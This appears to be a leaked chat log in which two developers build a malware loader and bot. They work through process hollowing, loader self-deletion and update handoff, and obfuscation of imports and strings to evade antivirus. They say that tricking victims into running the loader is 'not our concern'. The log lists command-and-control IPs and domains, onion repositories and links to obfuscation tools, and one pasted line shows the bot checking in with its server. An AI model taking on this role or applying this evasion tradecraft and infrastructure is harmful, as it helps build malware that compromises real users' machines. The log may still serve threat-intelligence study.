but isn't it replaced? is it removed from the download protocol?

2020-10-08T13:53:26 price -> mushroom
where and from where to delete?

2020-10-08T13:53:30 mushroom -> price
I downloaded another version of the loader, ran it, it deleted the previous version when it started.

2020-10-08T13:53:51 price -> mushroom
Ah, got it.

2020-10-08T13:54:08 price -> mushroom
Shouldn't it be hidden somewhere?

2020-10-08T13:54:22 price -> mushroom
Or is it just lying in the halls?

2020-10-08T13:54:25 mushroom -> price
dl1.exe downloaded and run dl2.exe, dl2.exe should remove dl1.exe at the start.

2020-10-08T13:54:26 price -> mushroom
files

2020-10-08T13:55:00 mushroom -> price
Hide it. But don't keep the old version, it will be spoiled.

2020-10-08T13:55:08 price -> mushroom
I have a dl6

2020-10-08T13:55:15 mushroom -> price
This is as an example.

2020-10-08T13:55:57 price -> mushroom
That is, you need to clean up the old version and record the new loader in its place

2020-10-08T13:56:08 mushroom -> price
Yes.

2020-10-08T13:56:28 price -> mushroom
got it

2020-10-08T13:56:58 mushroom -> price
To do this, pass the file path of the old version to the new version to be launched, so it can delete it.

2020-10-08T13:57:27 mushroom -> price
Any way you like.

2020-10-08T13:58:37 mushroom -> price
And pass the process id of the old one to the new one, if it won't be deleted, because as long as the process is running there is no way to delete the file.

2020-10-08T13:58:48 price -> mushroom
thanks

2020-10-08T13:59:07 mushroom -> price
Then you can wait until the old version is finished and safely delete its file.

2020-10-14T08:08:23 mushroom -> price
Hi. What did you do?

2020-10-14T08:09:01 price -> mushroom
hi

2020-10-14T08:09:36 price -> mushroom
downloading the bot and the loeder (already), now I will run the bot with holoving

2020-10-14T08:10:00 price -> mushroom
the day the servers did not work, I was looking for bugs in me

2020-10-14T08:43:24 mushroom -> price
Do the addresses still work?

2020-10-14T08:43:46 price -> mushroom
are there any new ones?

2020-10-14T08:44:12 price -> mushroom
worked yesterday, now I'm holoving out of the bot into a lowader

2020-10-14T08:44:30 mushroom -> price
bot

18.188.194.80 labelcs.com
54.91.36.142 freedubcs.com

loader

54.245.74.151 titlecs.com
54.145.79.240 mixcinc.com
3.138.117.231 nicknamec.com

2020-10-14T08:44:35 price -> mushroom
thanks

2020-10-14T08:44:40 mushroom -> price
In case they stop working.

2020-10-14T08:45:02 price -> mushroom
ok

2020-10-15T08:27:59 mushroom -> price
The addresses I gave you yesterday no longer work.

2020-10-15T08:28:11 mushroom -> price
Here are the old ones:
bot

3.137.180.197 cuprinc.com
3.238.75.236 shophoof.com

loader

34.221.202.231 breezdesign.com
54.83.253.135 hotenlighten.com
18.191.38.26 onebulks.com

2020-10-15T08:28:24 mushroom -> price
34.221.202.231 breezdesign.com this one does not work.

2020-10-15T08:28:26 price -> mushroom
thanks

2020-10-15T08:28:29 mushroom -> price
Check the others.

2020-10-15T08:28:45 price -> mushroom
Mine checks the entire clip and selects a working one

2020-10-15T08:29:17 price -> mushroom
now made pips to communicate when upgrading the loeder with another version, so bringing the end closer

2020-10-15T08:30:07 mushroom -> price
OK. And run everything, through all the commands. Then I'll take a look at it.

2020-10-15T08:30:16 price -> mushroom
ok

2020-10-15T08:30:53 price -> mushroom
But it is unclear in the terms of reference for the looder, it is written that it must also send information about the system to the server.

2020-10-15T08:31:09 price -> mushroom
you don't have to, right? if the bot is doing it

2020-10-15T08:32:13 mushroom -> price
No need, it says in the ToR that this is optional. And it's configurable when you build it with a macro.

2020-10-15T08:34:59 price -> mushroom
there you go - configurable by macro

2020-10-15T08:35:25 price -> mushroom
So it may not work, but it should be generated

2020-10-15T08:35:33 mushroom -> price
You don't have to do that yet.

2020-10-15T08:35:40 price -> mushroom
ok

2020-10-15T13:11:37 PM mushroom -> price
34.221.79.109 freexaims.com

2020-10-15T13:11:44 PM mushroom -> price
Another one.

2020-10-15T13:12:05 price -> mushroom
ok

2020-10-20T07:24:30 price -> mushroom
hi

2020-10-21T10:40:20 mushroom -> price
Hi. What test addresses did I give there?

2020-10-21T10:40:34 mushroom -> price
Write it down. I need to test it.

2020-10-21T10:40:48 price -> mushroom
I read everything, but now I have a problem

2020-10-21T10:41:06 price -> mushroom
I can't delete a temporary file

2020-10-21T10:41:15 price -> mushroom
access control error

2020-10-21T10:41:17 price -> mushroom
5

2020-10-21T10:41:47 mushroom -> price
This one is because it is used by the process I guess.

2020-10-21T10:42:04 mushroom -> price
You have to wait for completion or wait for some time.

2020-10-21T10:42:04 price -> mushroom
I wait 10 seconds for the exit to complete

2020-10-21T10:43:00 price -> mushroom
Tell me why you can't run the lowrider with holoving, but you have to run the bot?

2020-10-21T10:43:30 price -> mushroom
Well, I remember that some packed exerter might not go in holoving

2020-10-21T10:43:38 mushroom -> price
You download another version of the loader, run it, it waits until the previous version completes the process and deletes its file.

2020-10-21T10:43:40 price -> mushroom
Isn't that how the bot is packaged?

2020-10-21T10:43:49 mushroom -> price
The bot is not packaged.

2020-10-21T10:43:58 mushroom -> price
It is not saved to disk.

2020-10-21T10:43:59 price -> mushroom
got it

2020-10-21T10:44:11 mushroom -> price
You download another version of the loader, run it, it waits until the previous version completes the process and deletes its file.

2020-10-21T10:44:15 mushroom -> price
Is this how you do it?

2020-10-21T10:44:34 price -> mushroom
Here is an old version of my ld6 for example

2020-10-21T10:45:01 price -> mushroom
I start ld6 from it I download and save temp6

2020-10-21T10:45:58 price -> mushroom
start temp6 from there copy temp6 to ld6

2020-10-21T10:46:16 price -> mushroom
I run ld6 and try and cannot delete temp6

2020-10-21T10:47:36 mushroom -> price
ran ld6, it downloaded temp6, ran temp6, completed ld6, temp6 waits for ld6 process to complete, deletes ld6.

2020-10-21T10:47:47 price -> mushroom
Okay, I'll make up a test, because I wanted to go straight through

2020-10-21T10:47:47 price -> mushroom
Okay, I'll make up a test, because I wanted to go straight through

2020-10-21T10:48:07 mushroom -> price
You don't need to copy anything anywhere.

2020-10-21T10:48:15 price -> mushroom
ld6 no problem to remove

2020-10-21T10:48:27 mushroom -> price
I downloaded a file with a random name to temp and ran it.

2020-10-21T10:48:36 price -> mushroom
I thought it was supposed to store everything under the old name.

2020-10-21T10:48:45 mushroom -> price
Don't.

2020-10-21T10:48:54 PM price -> mushroom
Roger, the question is off the table.

2020-10-21T10:49:00 mushroom -> price
What's the point of that?

2020-10-21T10:49:11 price -> mushroom
but how does the loader start if the attachment is not made to it?

2020-10-21T10:49:20 mushroom -> price
No way.

2020-10-21T10:49:27 price -> mushroom
I thought the fixation on the old name

2020-10-21T10:49:42 mushroom -> price
Locking on your name.

2020-10-21T10:49:52 price -> mushroom
no problem to delete and run

2020-10-21T10:50:24 mushroom -> price
By the name of his file. GetModuleFileName

2020-10-21T10:50:36 price -> mushroom
I'm doing it all

2020-10-21T10:51:19 price -> mushroom
But in general, then it is not clear where does the lowader come from and where does it go if it is not needed after the bot starts?

2020-10-21T10:51:22 mushroom -> price
The same name you give to boot loader, and your PID, so it waits for it to complete the process.

2020-10-21T10:51:55 mushroom -> price
Lauder is a disposable program, all antivirus detections are on it.

2020-10-21T10:52:22 price -> mushroom
that's good, he worked off the bot uploaded and dangling in the files?

2020-10-21T10:52:26 mushroom -> price
How to sell the Lowder to the user is not our concern.

2020-10-21T10:52:59 price -> mushroom
but if it's running then it should update by version?

2020-10-21T10:53:00 mushroom -> price
Yes, it's hanging around in the files.

2020-10-21T10:53:09 mushroom -> price
In case of a fixation.

2020-10-21T10:53:32 price -> mushroom
How about a bot to remove it?

2020-10-21T10:53:40 price -> mushroom
fixing was abolished, right?

2020-10-21T10:53:52 mushroom -> price
If you run it, it should try to update if the version doesn't match.

2020-10-21T10:54:08 mushroom -> price
Deletion by siucid command.

2020-10-21T10:54:18 price -> mushroom
5.181.156.226

2020-10-21T10:54:19 price -> mushroom
CheckServer, 192 ---> Server https://5.181.156.226:443/api/v198 verified! LoaderVersion=2

2020-10-21T10:54:27 mushroom -> price
This completes the bot and deletes the loader file.

2020-10-21T10:54:39 price -> mushroom
both?

2020-10-21T10:54:51 price -> mushroom
How does the bot know the file name of the Lloyder?

2020-10-21T10:55:05 price -> mushroom
to remove

2020-10-21T10:55:24 mushroom -> price
Loader starts the bot, he can pass him his file name, I pass it through an environment variable.

2020-10-21T10:55:29 price -> mushroom
I didn't train my pipes for nothing for holoving

2020-10-21T10:55:39 mushroom -> price
You can also use the command line.

2020-10-21T10:55:52 price -> mushroom
it didn't work for me with holovinglem

2020-10-21T10:56:02 price -> mushroom
on the command line

2020-10-21T10:56:22 price -> mushroom
Or do you want to pass the process directly?

2020-10-21T10:56:23 mushroom -> price
Use the environment variable then.

2020-10-21T10:56:34 price -> mushroom
it does not sting ?

2020-10-21T10:57:02 mushroom -> price
No. There are plenty of these variables. Almost all programs use them.

2020-10-21T10:57:29 mushroom -> price
What eak doesn't work 1.exe 1234567

2020-10-21T10:57:32 price -> mushroom
Okay, I'm off to finish up, you asked about the address, see the answer?

2020-10-21T10:57:49 mushroom -> price
1234567 command line argument.

2020-10-21T10:58:00 mushroom -> price
Then GetCommandLine in the program.

2020-10-21T10:58:10 price -> mushroom
It's okay with me.

2020-10-21T10:58:23 price -> mushroom
argv works fine for me too

2020-10-21T10:58:26 price -> mushroom
bad

2020-10-21T10:58:58 price -> mushroom
but exactly holoving should be by getkommandline probably

2020-10-21T10:59:10 mushroom -> price
In /subsystem:windows there is no argv at all

2020-10-21T10:59:27 mushroom -> price
Always rely on GetCommandLine

2020-10-21T10:59:29 price -> mushroom
I have the same kind of

2020-10-21T10:59:32 mushroom -> price
Works everywhere.

2020-10-21T10:59:56 mushroom -> price
You have to keep it at work. Otherwise the console window will pop up.

2020-10-21T10:59:56 price -> mushroom
got it

2020-10-21T11:00:10 price -> mushroom
window does not pop up

2020-10-21T11:01:06 price -> mushroom
I need to check it, I didn't think about it, but when I started createprocess there is a newdose

2020-10-21T11:01:17 price -> mushroom
and you can't see anything

2020-10-21T11:01:36 mushroom -> price
In short, the most convenient way is to pass the file name as a command line argument or an environment variable.

2020-10-21T11:01:54 price -> mushroom
I get it now

2020-10-21T11:01:58 price -> mushroom
doing

2020-10-21T11:02:07 mushroom -> price
The window pops up at the Lowder I mean, you can't do a NoWindow there.

2020-10-21T11:02:21 mushroom -> price
It starts there with a double click.

2020-10-21T11:02:37 price -> mushroom
What do you mean from the conductor?

2020-10-21T11:03:02 mushroom -> price
Yes. A loader is a file that the user double-clicks to run.

2020-10-21T11:03:21 price -> mushroom
It's none of our business how he'll be forced into it?

2020-10-21T11:03:26 mushroom -> price
Yes.

2020-10-21T11:04:06 mushroom -> price
What addresses did I give you test addresses?

2020-10-21T11:04:15 mushroom -> price
I didn't keep them on me.

2020-10-21T11:04:18 price -> mushroom
5.181.156.226

2020-10-21T11:04:18 mushroom -> price
Write.

2020-10-21T11:04:24 price -> mushroom
Lowder

2020-10-21T11:04:34 price -> mushroom
[14:10:26] <mushroom> Here are the addresses to test:
bot

194.5.249.46

Lowder

5.181.156.226

2020-10-21T11:04:39 mushroom -> price
OK.

2020-10-21T11:04:41 price -> mushroom
Lowder works

2020-10-22T07:47:43 PM mushroom -> price
Hi. Did you finish it?

2020-10-22T07:48:26 price -> mushroom
there is no connection to the bot server, maybe they updated

2020-10-22T07:48:56 price -> mushroom
So I switched to the windows subsystem, delete everything I need, start the holoving process, but no connection

2020-10-22T07:50:20 mushroom -> price
Have you uploaded to GitLab?

2020-10-22T07:50:40 price -> mushroom
No, I haven't.

2020-10-22T07:50:58 price -> mushroom
do you have bot server addresses?

2020-10-22T07:51:20 mushroom -> price
And the bot?

2020-10-22T07:51:33 mushroom -> price
Bot you did.

2020-10-22T07:51:52 price -> mushroom
I am running the bot now and there is no validation of the servers

2020-10-22T07:52:10 price -> mushroom
the bot debugged everything a long time ago, but now there is no connection

2020-10-22T07:52:12 mushroom -> price
No signature?

2020-10-22T07:52:19 price -> mushroom
yes

2020-10-22T07:52:26 mushroom -> price
Then turn it off for now.

2020-10-22T07:52:40 price -> mushroom
I'm going to try it now.

2020-10-22T07:53:27 mushroom -> price
Upload to GitLab. To build a Release version with logs.

2020-10-22T07:53:50 price -> mushroom
ok

2020-10-22T07:54:28 PM mushroom -> price
What's left to do?

2020-10-22T07:54:37 PM mushroom -> price
Do you want to test the loader?

2020-10-22T07:55:02 price -> mushroom
1. restore bot's work (verification is not allowed)

2020-10-22T07:55:14 price -> mushroom
2. Load the bot into the admin area

2020-10-22T07:55:33 price -> mushroom
3. check how the loader loads the bot with holoving

2020-10-22T07:57:04 mushroom -> price
And I have a signature.

2020-10-22T07:57:31 price -> mushroom
that's weird, this address is 194.5.249.46?

2020-10-22T07:59:47 mushroom -> price
This address doesn't work at all.

2020-10-22T08:00:15 price -> mushroom
Which one works for you?

2020-10-22T08:00:26 price -> mushroom
 [14:10:26] <mushroom> Here are the addresses for testing:
bot

194.5.249.46

Lowder

5.181.156.226

2020-10-22T08:00:56 mushroom -> price
194.5.249.46 has stopped working.

2020-10-22T08:01:15 price -> mushroom
[10:57:02] <mushroom> And I have a signature.

2020-10-22T08:01:22 price -> mushroom
What's the address?

2020-10-22T08:02:35 mushroom -> price
I'll give you a new one then, they'll probably do it now. For now, update the bot project on GitLab, so I can build Release with logs.

2020-10-22T08:02:54 price -> mushroom
I'm uploading it now

2020-10-22T08:31:55 mushroom -> price
45.89.125.130

2020-10-22T08:36:49 price -> mushroom
thanks

2020-10-22T08:36:59 price -> mushroom
I'm going to try it now

2020-10-22T08:38:05 price -> mushroom
but tell me

2020-10-22T08:38:41 price -> mushroom
My bot started working and got into the honipots, I marked it bot and it went to the bots - how does it work and why?

2020-10-22T08:39:54 mushroom -> price
Maybe at the address, they shouldn't work in the CIS.

2020-10-22T08:40:05 mushroom -> price
You'd better make a note that this is a test bot.

2020-10-22T08:40:21 price -> mushroom
Thanks, I need to put a VPN

2020-10-22T08:40:28 price -> mushroom
How do you make a markup?

2020-10-22T08:40:55 mushroom -> price
I marked it as bot and it went to bots

2020-10-22T08:40:59 mushroom -> price
Also.

2020-10-22T08:41:07 mushroom -> price
The button on the right.

2020-10-22T08:41:12 price -> mushroom
I also guessed as I asked

2020-10-22T08:41:57 price -> mushroom
now I know everything

2020-10-22T08:42:36 price -> mushroom
It seemed to work for me.

2020-10-22T08:43:08 price -> mushroom
and verification and holoving in the laptop and knockout in the admin panel!

2020-10-22T08:43:46 mushroom -> price
Check all commands.

2020-10-22T08:44:21 price -> mushroom
yes, everything has to be cleaned there (not from AV, but then from AV as well)

2020-10-22T08:44:26 price -> mushroom
ok

2020-10-22T08:44:52 price -> mushroom
I updated the bot in gitlab, and I'll upload the loeder now

2020-10-22T08:45:06 price -> mushroom
Since it has become so functional

2020-10-22T10:00:10 price -> mushroom
https://n4iaacb37wmqclht.onion/price/WCRT.git - library for assembly without CRT

2020-10-22T10:00:14 price -> mushroom
https://n4iaacb37wmqclht.onion/price/ld6.git

2020-10-22T10:00:36 price -> mushroom
https://n4iaacb37wmqclht.onion/price/bd6.git

2020-10-22T10:00:48 price -> mushroom
I'm about to open access

2020-10-22T10:02:21 price -> mushroom
opened

2020-10-22T10:02:49 price -> mushroom
ld6 refers to the wcrt project

2020-10-22T10:03:34 price -> mushroom
bd6 contains this project internally, but I will redo it to a single separate project as for ld6

2020-10-22T13:32:03 mushroom -> price
Not going to bd6.

2020-10-22T13:32:25 mushroom -> price
Download a clean bd6 project from GitLab and build it.

2020-10-22T13:32:25 price -> mushroom
What does it say?

2020-10-22T13:32:36 price -> mushroom
ok

2020-10-22T13:32:48 price -> mushroom
I'll build it in a virtual machine now.

2020-10-22T13:32:54 mushroom -> price
Lots of undeclared identifiers.

2020-10-22T13:33:18 mushroom -> price
command line warning D9025: override "/sdl-" by "/GS-"

2020-10-22T13:33:47 mushroom -> price
Did you pay attention to this?

2020-10-22T13:33:49 price -> mushroom
this is just a warning, there are many things defined in the properties of the project

2020-10-22T13:34:05 mushroom -> price
It turns out that the checks are not disabled.

2020-10-22T13:34:08 price -> mushroom
I will disassemble and remove the excess

2020-10-22T13:34:31 price -> mushroom
the checks tried to turn everything off

2020-10-22T13:34:45 mushroom -> price
You turned them off in one place and turned them back on in another place.

2020-10-22T13:34:49 price -> mushroom
I'll put it together now and look at it.

2020-10-22T13:35:10 mushroom -> price
Try to build a clean one.

2020-10-22T13:35:28 price -> mushroom
So in the VM, there was nothing like that.

2020-10-22T13:35:45 mushroom -> price
Directly downloaded, opened, selected Release x64 clicked run.

2020-10-22T13:35:54 price -> mushroom
yes

2020-10-22T13:35:57 mushroom -> price
To get everything assembled and running.

2020-10-22T13:36:16 mushroom -> price
And so is dl6.

2020-10-22T13:39:02 mushroom -> price
he command line warning D9025: Override "/sdl-" by "/GS-"

2020-10-22T13:39:18 mushroom -> price
Erase /sdl- in the settings

2020-10-22T13:39:26 price -> mushroom
ok

2020-10-22T13:39:28 mushroom -> price
The line is just empty in this field.

2020-10-22T13:40:27 price -> mushroom
i.e. not No (/sdl-)

2020-10-22T13:40:45 mushroom -> price
Yes.

2020-10-22T13:41:21 price -> mushroom
command line warning D9025: overriding '/sdl-' with '/GS-'

2020-10-22T13:41:29 price -> mushroom
it reads like this

2020-10-22T13:41:53 mushroom -> price
Are you sure you erased it?

2020-10-22T13:42:02 price -> mushroom
But this means that the option '/sdl-' is interchanged to '/GS-'

2020-10-22T13:42:06 price -> mushroom
sure

2020-10-22T13:42:08 mushroom -> price
Maybe you erased it in the wrong assembly.

2020-10-22T13:42:12 price -> mushroom
clicked apply

2020-10-22T13:42:20 price -> mushroom
for all configurations

2020-10-22T13:42:33 mushroom -> price
I erased in your bd6 I have nothing.

2020-10-22T13:43:00 mushroom -> price
Okay. It's not critical. Make it fit.

2020-10-22T13:43:33 price -> mushroom
So maybe you don't have Disable Security Check (/GS-)?

2020-10-22T13:43:48 price -> mushroom
even though you are collecting in my project

2020-10-22T13:44:03 mushroom -> price
Check. I'm building your bd6.

2020-10-22T13:44:15 mushroom -> price
All your settings. GS- is there.

2020-10-22T13:44:18 price -> mushroom
that's how I admitted it, we're running the same thing

2020-10-22T13:44:33 mushroom -> price
I can't get it together yet.

2020-10-22T13:44:43 mushroom -> price
I'm waiting for you to fix it.

2020-10-22T13:45:06 price -> mushroom
fixing

2020-10-22T13:54:59 price -> mushroom
removed the overrides. it was the wcrt project that gave them

2020-10-22T13:55:17 mushroom -> price
Can I see it?

2020-10-22T13:55:23 price -> mushroom
the creature virtualbox started updating

2020-10-22T13:55:45 price -> mushroom
on the git I abandoned, but haven't checked the VM is slowing down yet

2020-10-22T13:57:45 mushroom -> price
Did you only remove the sdl?

2020-10-22T13:58:03 mushroom -> price
I thought it was possible to collect already.

2020-10-22T13:58:07 price -> mushroom
for now yes. the main goal is to build your project.

2020-10-22T13:58:19 price -> mushroom
no VM to try

2020-10-22T13:58:46 price -> mushroom
he writes in the process This may take several minutes (it's been 10)

2020-10-22T13:59:04 price -> mushroom
I'll wait one more minute and scan

2020-10-22T13:59:10 mushroom -> price
Write it then.

2020-10-22T13:59:17 price -> mushroom
of course

2020-10-23T09:31:44 price -> mushroom
Hi. Got everything uploaded to Git. Created a windup 2004 VM. Installed Studio. Downloaded 3 projects from Git. Built all configurations without errors with Batch Build. Bounce out of VM.

2020-10-23T09:45:52 mushroom -> price
Hi. Got everything uploaded to Git. Created a windup 2004 VM. Installed Studio. Downloaded 3 projects from Git. Built all configurations without errors with Batch Build. Bounce out of VM.

2020-10-23T12:50:54 PM mushroom -> price
Hi. Can't see your projects, GitLab isn't working.

2020-10-23T12:51:36 mushroom -> price
Here is an example of WInAPi obfuscation:
Download: https://qaz.im/load/RAaKti/BAHiQa
Delete: https://qaz.im/index.php?a=delete&q=323784015
Password: ERa{kNNS? *J#r|*T"

2020-10-23T12:51:37 price -> mushroom
It's okay I'm solving a riddle here and doing better.

2020-10-23T12:51:58 mushroom -> price
The point is to get the address of the function on the fly, so it won't be in the binary import.

2020-10-23T12:52:05 price -> mushroom
Everything works fine in debug x64

2020-10-23T12:52:21 mushroom -> price
All WinApi functions should be obfuscated, except string lstrlen etc.

2020-10-23T12:52:43 price -> mushroom
but the call to the WinMainCRTStartup function is missing in the relise

2020-10-23T12:52:46 mushroom -> price
Then look at the imports.

2020-10-23T12:52:56 price -> mushroom
I'll take a look and do it.

2020-10-23T12:53:06 mushroom -> price
WinMainCRTStartup is standard, it is not suspicious.

2020-10-23T12:53:42 price -> mushroom
I mean that it disappears with the whole chain of calls and the program becomes 4 kb to terminate at once

2020-10-23T12:53:57 price -> mushroom
I'm going to patch it now, but I have to deal with it.

2020-10-23T12:55:36 mushroom -> price
Obfuscator strings:
Download: https://qaz.im/load/Gi4yZZ/b6dSGf
Delete: https://qaz.im/index.php?a=delete&q=868739743
Password: "MC>w#l!f@B!:pwYO

2020-10-23T12:55:45 price -> mushroom
I have Git working.

2020-10-23T12:55:53 mushroom -> price
Obfuscate all lines in the program.

2020-10-23T12:56:06 mushroom -> price
Then check the binary to make sure there aren't any.

2020-10-23T12:56:25 mushroom -> price
_STR("str") ANSI, _WCS("str") UNICODE

2020-10-23T12:56:38 price -> mushroom
ok

2020-10-23T12:57:35 mushroom -> price
When you use _WCS, you should first write to buffer intermediate and then use it:
WCHAR[100] str;
lstrcpyW(str, _WCS(L "str));
you use str

2020-10-23T12:57:52 mushroom -> price
For ANSI you can directly use _STR("str")

2020-10-23T12:59:23 mushroom -> price
Another alternative string obfuscator:
Download: https://qaz.im/load/TZRaZF/yhFskK
Delete: https://qaz.im/index.php?a=delete&q=731386863
Password: u[y*%3Y=H5P0S4<P

2020-10-23T12:59:31 mushroom -> price
It doesn't work with Unicode.

2020-10-23T12:59:48 mushroom -> price
That's the only way _STR is there.

2020-10-23T13:00:11 mushroom -> price
Obfuscate everything in bot and loader.

2020-10-23T13:00:30 price -> mushroom
it is critical to use unicode

2020-10-23T13:00:32 price -> mushroom
?

2020-10-23T13:00:43 price -> mushroom
Or multibytes can be stopped at

2020-10-23T13:00:45 mushroom -> price
No.

2020-10-23T13:00:57 mushroom -> price
Whatever you want to use.

2020-10-23T13:01:07 price -> mushroom
they say in multibytes is not good with paths in japan

2020-10-23T13:01:11 mushroom -> price
In Unicode, the program is larger simply by size.

2020-10-23T13:01:40 price -> mushroom
I mean when using strictly ansi won't it get up later?

2020-10-23T13:01:51 price -> mushroom
into the problem

2020-10-23T13:02:11 mushroom -> price
And you use TEXT

2020-10-23T13:02:24 mushroom -> price
Then you can switch easily.

2020-10-23T13:02:48 price -> mushroom
it's not that easy to switch

2020-10-23T13:02:51 mushroom -> price
_TSTR(TEXT("str")) automatically obfuscates ansi and unicode as well.

2020-10-23T13:02:59 price -> mushroom
the functions are strictly ansiche or vice versa

2020-10-23T13:03:35 mushroom -> price
Which ones are these?

2020-10-23T13:03:47 mushroom -> price
They all seem to come in two kinds.

2020-10-23T13:03:53 price -> mushroom
I don't know, I saw it yesterday.

2020-10-23T13:04:14 price -> mushroom
e.g. CommandLineToArgvA

2020-10-23T13:04:19 mushroom -> price
Do everything ansi then.

2020-10-23T13:04:32 price -> mushroom
Thank you, right off the bat.

2020-10-23T13:04:39 mushroom -> price
It will be a smaller size.

2020-10-23T13:05:13 mushroom -> price
CommandLineToArgvW

2020-10-23T13:05:13 PM mushroom -> price
There is one.

2020-10-23T13:05:14 price -> mushroom
But I have a real miracle, missing the input to the function in the program

2020-10-23T13:06:41 price -> mushroom
on release

2020-10-23T13:06:41 price -> mushroom
at ld6

2020-10-23T13:07:04 mushroom -> price
You can enter the point of entry yourself.

2020-10-23T13:07:11 mushroom -> price
In the project settings.

2020-10-23T13:07:11 price -> mushroom
and I have all ansi and can't use it, but I already have the ansi

2020-10-23T13:07:34 price -> mushroom
that's a good idea, I'm going to try it out

2020-10-23T13:07:38 mushroom -> price
Subsystem windows does not have a mainCRTSTartup input.

2020-10-23T13:07:51 mushroom -> price
winmainCRTSTartup

2020-10-23T13:07:55 mushroom -> price
something like this.

2020-10-23T13:07:56 price -> mushroom
this is it for debugging

2020-10-23T13:08:15 price -> mushroom
well yes WinMainCRTStartup

2020-10-23T13:08:35 price -> mushroom
I'll fix it now.

2020-10-23T13:09:18 price -> mushroom
FUCK!

2020-10-23T13:09:37 price -> mushroom
I already had it fixed in the ld6 configuration

2020-10-23T13:09:45 price -> mushroom
And you have to erase it!

2020-10-23T13:10:08 price -> mushroom
bingo

2020-10-23T13:11:02 price -> mushroom
That's it! Ready for obfuscation!

2020-10-23T13:11:31 price -> mushroom
There is a knockout on the release, there is logging to a file and to the console

2020-10-23T13:12:12 price -> mushroom
disable logging for release, put in for debugging release build

2020-10-23T13:12:34 mushroom -> price
More. Make Release_nologs builds, same as Release, but all lines are obfuscated and no output.

2020-10-23T13:12:50 price -> mushroom
yes, of course

2020-10-23T13:13:09 mushroom -> price
It should be Debug, Release with output, Release_nologs as I wrote above.

2020-10-23T13:13:22 mushroom -> price
Release should be with the output. This is for testers.

2020-10-23T13:13:53 mushroom -> price
To be at the top to choose what to collect, you know.

2020-10-23T13:13:58 price -> mushroom
do you when you generate and me check the Batch build? is it transferred to the Git when you Push?

2020-10-23T13:14:05 mushroom -> price
In Visual Studio.

2020-10-23T13:14:36 price -> mushroom
checkboxes in the batch build

2020-10-23T13:14:50 mushroom -> price
Where is this batch build?

2020-10-23T13:14:58 mushroom -> price
I don't know that one.

2020-10-23T13:15:09 price -> mushroom
cool stuff

2020-10-23T13:15:24 price -> mushroom
enter Build

2020-10-23T13:15:38 price -> mushroom
and in the Batch Build drop-down window

2020-10-23T13:15:56 price -> mushroom
There you specify all the necessary configurations and wait for the fate of the assembly

2020-10-23T13:16:27 price -> mushroom
In Russian I can not say how, maybe the assembly?

2020-10-23T13:16:31 mushroom -> price
What is the Russian word for it?

2020-10-23T13:16:48 price -> mushroom
5 position in the top menu of the studio

2020-10-23T13:16:56 price -> mushroom
after project

2020-10-23T13:17:01 mushroom -> price
Batch assembly.

2020-10-23T13:17:05 price -> mushroom
yes

2020-10-23T13:17:10 price -> mushroom
Go in and you'll love it.

2020-10-23T13:17:17 mushroom -> price
It's easier to specify dependencies, projects.

2020-10-23T13:17:39 mushroom -> price
Did you make me select bd6 to assemble and everything you need is assembled?

2020-10-23T13:17:40 price -> mushroom
and when everything needs to be configured or checked

2020-10-23T13:18:12 price -> mushroom
I did this morning, checked on VM and when sending/downloading from GITA

2020-10-23T13:18:38 price -> mushroom
I'll check again now since there have been changes

2020-10-23T13:18:49 mushroom -> price
Okay. When GitLab is up and running, I'll take a look at it. For now, obfuscate everything in Release_nologs.

2020-10-23T13:19:23 price -> mushroom
is this only to be done in this assembly, but the others should be avoided?

2020-10-23T13:19:33 mushroom -> price
Yes.

2020-10-23T13:19:36 price -> mushroom
ok

2020-10-23T13:19:58 mushroom -> price
Lines with macro OBFUSCATED_STRINGS are included.

2020-10-23T13:20:23 mushroom -> price
So it's easy to do obfuscation where needed in assemblies.

2020-10-23T13:21:00 price -> mushroom
Where does AV work?

2020-10-23T13:21:16 mushroom -> price
Release_nologs

2020-10-23T13:21:24 mushroom -> price
Only there.

2020-10-23T13:21:31 mushroom -> price
All lines are static.

2020-10-23T14:08:16 mushroom -> price
Started bd6. Silence. Are the addresses working there?

2020-10-23T14:08:35 price -> mushroom
I'm working

2020-10-23T14:08:42 mushroom -> price
Nothing is written in the console.

2020-10-23T14:08:49 price -> mushroom
make c:\log6

2020-10-23T14:08:58 mushroom -> price
And in the console?

2020-10-23T14:08:59 price -> mushroom
and there will be an output

2020-10-23T14:09:18 price -> mushroom
In the console, debug

2020-10-23T14:09:23 price -> mushroom
for now

2020-10-23T14:09:38 price -> mushroom
working with this right now, userfriendly

2020-10-23T14:13:30 price -> mushroom
I'm running it from VM now, there's a response. The release config and there is both console and to file.

2020-10-23T14:13:46 price -> mushroom
Maybe also download ld6 from git?

2020-10-23T14:14:08 PM mushroom -> price
Already up to date.

2020-10-23T14:14:33 price -> mushroom
I will correct it now with new changes

2020-10-23T14:39:15 price -> mushroom
does not fluff

2020-10-23T14:39:37 price -> mushroom
Can't complete SOCKS5 connection to n4iaacb37wmqclht.onion:443.

2020-10-23T14:40:16 mushroom -> price
Me too.

2020-10-23T14:40:24 mushroom -> price
Works that way all the time.

2020-10-23T14:40:31 mushroom -> price
Every once in a while.

2020-10-23T14:41:15 price -> mushroom
I've flushed it twice and nothing.

2020-10-23T15:32:13 price -> mushroom
sorry off topic. Do you know how to read input() from the keyboard in python in studio?

2020-10-23T15:32:44 mushroom -> price
I don't know. I haven't worked with python.

2020-10-23T15:33:18 price -> mushroom
I have a kid who beats eof exception keeps getting thrown out

2020-10-23T15:35:41 mushroom -> price
It says value = input("enter something")
    Python user input from the keyboard can be read using the input() built-in function.
    The input from the user is read as a string and can be assigned to a variable.
    After entering the value from the keyboard, we have to press the "Enter" button. Then the input() function reads the value entered by the user.
    The program halts indefinitely for the user input. There is no option to provide timeout value.
    If we enter EOF (*nix: Ctrl-D, Windows: Ctrl-Z+Return), EOFError is raised and the program is terminated.

2020-10-23T15:36:41 price -> mushroom
As soon as it reaches the input operator, it immediately hangs in an exception

2020-10-23T15:37:15 price -> mushroom
I do not enter anything by hand, only by pressing the green triangle-execute

2020-10-23T15:38:00 price -> mushroom
Spit doesn't matter, I'm asking for a ball, not to bullshit

2020-10-23T15:38:23 mushroom -> price
And I entered and read everything on the python command line.

2020-10-23T15:38:40 price -> mushroom
here you go

2020-10-23T15:38:51 price -> mushroom
And in IDE?

2020-10-23T15:39:05 price -> mushroom
But I like the idea.

2020-10-23T15:39:21 mushroom -> price
So there is a problem with the IDE.

2020-10-23T15:39:59 price -> mushroom
how to start python?

2020-10-23T15:40:08 price -> mushroom
on the terminal

2020-10-23T15:40:16 mushroom -> price
python.exe at the command line

2020-10-23T15:40:23 mushroom -> price
It must be in path

2020-10-23T15:40:35 price -> mushroom
clearly

2020-10-23T15:40:44 price -> mushroom
